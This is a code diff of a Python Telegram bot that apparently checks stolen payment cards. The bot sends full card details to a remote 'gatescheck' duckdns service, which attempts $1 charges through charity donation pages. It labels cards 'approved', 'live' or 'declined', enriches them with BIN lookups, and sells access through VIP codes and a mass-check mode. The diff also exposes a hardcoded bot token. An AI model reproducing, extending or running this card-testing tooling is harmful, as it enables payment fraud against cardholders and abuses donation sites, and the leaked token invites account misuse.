@@ -14,10 +14,10 @@ TOKEN = '8689698569:AAF6GOOcFdsTnG_UXXHLqWkis0bCsIFsQJQ'
 
 # ------------------- Users -------------------
 
-ADMINS = [6843321125]  # ضع هنا ID الأدمن
-VIP_USERS = {}       # {user_id: expiration_timestamp}
-BANNED_USERS = {}    # {user_id: True}
-ALL_USERS = set()    # كل مستخدم دخل البوت
+ADMINS = [6843321125]
+VIP_USERS = {}
+BANNED_USERS = {}
+ALL_USERS = set()
 stop_users = {}
 last_check_time = {}
 ANTI_SPAM_SECONDS = 7
@@ -29,17 +29,11 @@ GATES = [
     "https://www.wfft.org/donations/general-donation/"
 ]
 
-# قائمة APIs للفحص مع التبديل التلقائي
-GATES_CHECK_API = [
-    "http://gatescheck.duckdns.org:7000/check",
-]
-
-gate_index = 0
 api_semaphore = asyncio.Semaphore(6)
 
 # ------------------- Codes -------------------
 
-CODES = {}  # {"WAFA-XXXX-XXXX-XXXX": {"duration":7, "max_users":5, "used":0, "created":timestamp}}
+CODES = {}
 
 # ------------------- BIN Lookup -------------------
 
@@ -49,44 +43,55 @@ async def get_bin_info(bin_number):
         f"https://bins.antipublic.cc/bins/{bin_number}",
         f"https://bincheck.io/api/{bin_number}"
     ]
-    info = bank = country = emoji = currency = None
+
+    info = None
+    bank = None
+    country = None
+    emoji = None
+    currency = None
 
     for url in urls:
         try:
             async with httpx.AsyncClient(timeout=8) as client:
                 r = await client.get(url)
+
                 if r.status_code != 200:
                     continue
+
                 data = r.json()
 
                 if not info:
                     scheme = data.get("scheme") or data.get("brand") or data.get("type")
                     card_type = data.get("type") or data.get("card_type")
                     brand = data.get("brand") or data.get("scheme") or data.get("type")
+
                     if scheme or card_type or brand:
                         info = f"{scheme or 'Unknown'} - {card_type or 'Unknown'} - {brand or 'Unknown'}"
 
                 if not bank:
                     b = data.get("bank", {})
+
                     if isinstance(b, dict):
                         bank = b.get("name")
                     else:
                         bank = b
+
                     if not bank:
                         bank = data.get("issuer") or data.get("bank_name")
 
                 if not country:
                     c = data.get("country", {})
+
                     if isinstance(c, dict):
                         country = c.get("name")
-                        emoji = c.get("emoji", '🏳️')
+                        emoji = c.get("emoji", "🏳️")
                         currency = c.get("currency", "UNK")
                     else:
                         country = c
-                        emoji = '🏳️'
+                        emoji = "🏳️"
                         currency = "UNK"
 
-        except:
+        except Exception:
             continue
 
     return {
@@ -98,26 +103,32 @@ async def get_bin_info(bin_number):
 # ------------------- Check API -------------------
 
 async def check_card_api(card_full):
-    global gate_index
-    gate = GATES[gate_index % len(GATES)]  # اختيار gate
-    check_api = GATES_CHECK_API[gate_index % len(GATES_CHECK_API)]  # اختيار api
-    gate_index += 1  # تحديث الفهرس للتبديل التلقائي
-
-    params = {"url": gate, "card": card_full, "amount": 1.00}
+    gate = random.choice(GATES)
+    params = {
+        "url": gate,
+        "card": card_full,
+        "amount": 1.00
+    }
 
     async with api_semaphore:
         try:
             async with httpx.AsyncClient(timeout=20) as client:
-                r = await client.get(check_api, params=params)
-                result_raw = r.json().get('result','')
+                r = await client.get(
+                    "http://Gatecheck.duckdns.org:7000/check",
+                    params=params
+                )
+
+                result_raw = r.json().get("result", "")
                 result = result_raw.lower()
+
                 if "charge" in result or "success" in result:
                     return "approved", result_raw
                 elif "insufficient" in result:
                     return "live", result_raw
                 else:
                     return "declined", result_raw
-        except:
+
+        except Exception:
             return "declined", "Error"
 
 # ------------------- Format Response -------------------
@@ -125,26 +136,33 @@ async def check_card_api(card_full):
 async def format_response(card_full, status, response, taken, mode="single"):
     bin_number = card_full.split("|")[0][:6]
     bin_data = await get_bin_info(bin_number)
-    info, bank, country = bin_data["info"], bin_data["bank"], bin_data["country"]
 
-    title = "#PayPal_Charge ($1) [single] 🌟" if mode=="single" else "#PayPal_Charge ($1) [mass] 🌟"
+    info = bin_data["info"]
+    bank = bin_data["bank"]
+    country = bin_data["country"]
 
-    return f"""{title}
-- - - - - - - - - - - - - - - - - - - - - -
-[ϟ] 𝐂𝐚𝐫𝐝: {card_full}
-[ϟ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {response}
-[ϟ] 𝐒𝐭𝐚𝐭𝐮𝐬: {status.upper()}
-[ϟ] 𝐓𝐚𝐤𝐞𝐧: {taken}s
-- - - - - - - - - - - - - - - - - - - - - -
-[ϟ] 𝐈𝐧𝐟𝐨: {info}
-[ϟ] 𝐁𝐚𝐧𝐤: {bank}
-[ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
-- - - - - - - - - - - - - - - - - - - - - -
-[⌥] 𝐓𝐢𝐦𝐞: {taken}s
-[⎇] 𝐑𝐞𝐪 𝐁𝐲: VIP
-- - - - - - - - - - - - - - - - - - - - - -
-[⌤] 𝐃𝐞𝐯 𝐛𝐲: Wafa - 🍀
-"""
+    if mode == "single":
+        title = "#PayPal_Charge ($1) [single] 🌟"
+    else:
+        title = "#PayPal_Charge ($1) [mass] 🌟"
+
+    return (
+        f"{title}\n"
+        "- - - - - - - - - - - - - - - - - - - - - -\n"
+        f"[ϟ] 𝐂𝐚𝐫𝐝: {card_full}\n"
+        f"[ϟ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {response}\n"
+        f"[ϟ] 𝐒𝐭𝐚𝐭𝐮𝐬: {status.upper()}\n"
+        f"[ϟ] 𝐓𝐚𝐤𝐞𝐧: {taken}s\n"
+        "- - - - - - - - - - - - - - - - - - - - - -\n"
+        f"[ϟ] 𝐈𝐧𝐟𝐨: {info}\n"
+        f"[ϟ] 𝐁𝐚𝐧𝐤: {bank}\n"
+        f"[ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}\n"
+        "- - - - - - - - - - - - - - - - - - - - - -\n"
+        f"[⌥] 𝐓𝐢𝐦𝐞: {taken}s\n"
+        "[⎇] 𝐑𝐞𝐪 𝐁𝐲: VIP\n"
+        "- - - - - - - - - - - - - - - - - - - - - -\n"
+        "[⌤] 𝐃𝐞𝐯 𝐛𝐲: Wafa - 🍀"
+                    )
 
 # ------------------- Permissions -------------------
 
